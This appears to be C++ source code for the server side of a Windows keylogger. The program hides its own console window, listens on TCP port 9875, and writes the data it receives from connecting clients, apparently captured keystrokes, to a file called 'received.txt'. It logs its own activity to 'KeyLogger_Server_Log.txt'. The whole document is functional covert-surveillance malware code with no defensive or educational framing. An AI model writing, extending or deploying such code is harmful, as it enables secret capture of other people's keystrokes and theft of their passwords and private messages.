#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <fstream>
#include <iostream>
#include <pthread.h>

#pragma comment(lib, "Ws2_32.lib")

void Stealth() //HIDES CONSOLE
{
    HWND Stealth;
    AllocConsole();
    Stealth = GetConsoleWindow();
    ShowWindow(Stealth,0);
}

void LogIntoFile(std::string input, bool timeStamp, std::string logFileType) //BASIC LOG FUNCTION
{
    std::ofstream logFileS;
    logFileS.open(logFileType, std::ios_base::app);
    if(timeStamp)
    {
        time_t timeNow = time(0);
        tm *time = localtime(&timeNow);
        logFileS << "[" << time->tm_mday << "/" << 1 + time->tm_mon << "/" << 1900 + time->tm_year << " - " << time->tm_hour << ":" << time->tm_min << ":" << time->tm_sec << "] " << input << std::endl;
    }
    else
    {
        logFileS << input;
    }
    logFileS.close();
}

int Socket()
{
    while(1)
    {
        WSADATA wsaData;
        SOCKET serverSocket, newConnection;
        SOCKADDR_IN ServerAddr, SenderInfo;
        unsigned int Port = 9875;
        char recvbuff[1024];
        int ByteReceived, i, nlen, SelectTiming;
        WSAStartup(MAKEWORD(2,2), &wsaData);

        //printf("Server: Winsock DLL status is %s.\n", wsaData.szSystemStatus);

        serverSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

        if(serverSocket == INVALID_SOCKET)
        {
            LogIntoFile("Error: socket() failed: " + std::to_string(WSAGetLastError()),true,"KeyLogger_Server_Log.txt");
            WSACleanup();
            Sleep(100);
            continue;
        }
        else
        {
            LogIntoFile("Socket() is OK!",true,"KeyLogger_Server_Log.txt");
        }
        
        ServerAddr.sin_family = AF_INET;
        ServerAddr.sin_port = htons(Port);
        ServerAddr.sin_addr.s_addr = htonl(INADDR_ANY);

        if(bind(serverSocket,(sockaddr *)&ServerAddr,sizeof(ServerAddr)) == SOCKET_ERROR)
        {
            LogIntoFile("Error: bind() failed: " + std::to_string(WSAGetLastError()),true,"KeyLogger_Server_Log.txt");
            closesocket(serverSocket);
            WSACleanup();
            Sleep(100);
            continue;
        }
        else
        {
            LogIntoFile("Bind() is OK!",true,"KeyLogger_Server_Log.txt");
        }
        
        if(listen(serverSocket, 5) == SOCKET_ERROR)
        {
            LogIntoFile("Error: listen() failed: " + std::to_string(WSAGetLastError()),true,"KeyLogger_Server_Log.txt");
            closesocket(serverSocket);
            WSACleanup();
            Sleep(100);
            continue;
        }
        else
        {
            LogIntoFile("listen() ok and listening for incomming connections",true,"KeyLogger_Server_Log.txt");
        }

        while(1)
        {
            newConnection = SOCKET_ERROR;
            while(newConnection == SOCKET_ERROR)
            {
                newConnection = accept(serverSocket, NULL, NULL);
                if(newConnection != INVALID_SOCKET)
                {
                    LogIntoFile("accept() is OK ready to receive and send data",true,"KeyLogger_Server_Log.txt");
                }
                else
                {
                    LogIntoFile("Error: accept() failed: " + std::to_string(WSAGetLastError()),true,"KeyLogger_Server_Log.txt");
                }
                std::ofstream logFileS;
                logFileS.open("received.txt", std::ios_base::app | std::ios::binary);
                while(1)
                {
                    if(ByteReceived = recv(newConnection, recvbuff, sizeof(recvbuff), 0) > 0)
                    {
                        //LogIntoFile("Receiving data from client!",true,"KeyLogger_Server_Log.txt");
                        logFileS << recvbuff << std::endl;
                        memset(recvbuff, 0, sizeof recvbuff);
                        Sleep(10);
                    }
                    else if(ByteReceived == SOCKET_ERROR)
                    {
                        LogIntoFile("Error: recv() failed: " + std::to_string(WSAGetLastError()),true,"KeyLogger_Server_Log.txt");
                        break;
                    }
                    else
                    {
                        LogIntoFile("Warning: No data received!",true,"KeyLogger_Server_Log.txt");
                        break;
                    }
                }

                logFileS.close();
                LogIntoFile("File closed and received!",true,"KeyLogger_Server_Log.txt");
                
                if( shutdown(newConnection, SD_SEND) != 0)
                {
                    LogIntoFile("Warning: shutdown() failed: " + std::to_string(WSAGetLastError()),true,"KeyLogger_Server_Log.txt");
                    closesocket(serverSocket);
                    WSACleanup();
                    break;
                }
                else
                {
                    LogIntoFile("shutdown() looks OK",true,"KeyLogger_Server_Log.txt");
                    closesocket(serverSocket);
                    WSACleanup();
                    break;
                }
                break;
            }
        break;
        }
    }
    return 0;
}

int main(int argc, char const *argv[])
{
    Stealth();
    return Socket();
}